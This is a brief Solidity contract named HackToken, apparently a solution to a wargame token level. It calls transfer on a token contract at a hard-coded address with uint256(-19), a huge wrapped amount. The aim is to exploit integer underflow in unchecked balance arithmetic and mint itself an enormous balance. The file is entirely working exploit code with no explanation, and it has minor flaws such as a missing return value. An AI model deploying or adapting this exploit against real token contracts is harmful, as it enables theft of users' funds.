// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Token.sol';
contract HackToken {
    
  Token public token = Token(0xde56Ca3578c7734926a176F000F306064A625bA2);

  
  function transfer(address _to) public returns (bool) {
    uint256 MAX_INT = uint256(-19);
    token.transfer(_to, MAX_INT);
  }

}